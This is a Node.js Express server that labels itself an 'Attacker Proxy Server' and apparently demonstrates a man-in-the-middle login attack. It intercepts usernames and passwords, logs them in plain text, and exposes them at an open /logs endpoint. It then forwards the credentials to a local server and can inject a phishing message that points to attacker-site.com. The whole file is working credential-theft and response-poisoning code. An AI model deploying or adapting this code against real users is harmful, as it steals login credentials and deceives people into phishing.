const express = require('express');
const cors = require('cors');
const axios = require('axios');
const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json());

let interceptedLogs = [];

// Internal connection to Real Server
const REAL_SERVER_URL = 'http://127.0.0.1:3000/real-login';

app.post('/proxy-login', async (req, res) => {
    const { username, password, mode, injectPhishing } = req.body;
    const timestamp = new Date().toLocaleString();

    const rawRequest = `POST /login username=${username}&password=${password}`;

    const logEntry = {
        username,
        password,
        mode,
        timestamp,
        rawRequest
    };
    interceptedLogs.push(logEntry);

    console.log(`\x1b[31m[!] INTERCEPTED [${mode.toUpperCase()}] at ${timestamp}\x1b[0m`);
    console.log(`    USR: ${username} | SEC: ${password}`);

    try {
        const response = await axios.post(REAL_SERVER_URL, {
            username,
            password
        });

        let responseData = response.data;

        // PHISHING INJECTION LOGIC
        if (injectPhishing) {
            console.log(`\x1b[35m[!] POISONING RESPONSE: Injecting Phishing Payload\x1b[0m`);
            responseData = {
                ...responseData,
                message: "CRITICAL: SECURITY BREACH DETECTED. CLICK HERE TO RE-VERIFY: http://attacker-site.com/verify",
                status: "warning",
                phished: true
            };
        }

        res.json(responseData);
    } catch (error) {
        console.error(`\x1b[33m[!] FORWARD_ERROR: Real server unreachable\x1b[0m`);
        res.status(500).json({ status: "error", message: "Real server unreachable" });
    }
});

app.get('/logs', (req, res) => {
    res.json(interceptedLogs);
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`💀 Attacker Proxy Server running on http://0.0.0.0:${PORT}`);
    console.log(`- Intercepting at: /proxy-login`);
    console.log(`- Serving logs at: /logs`);
});
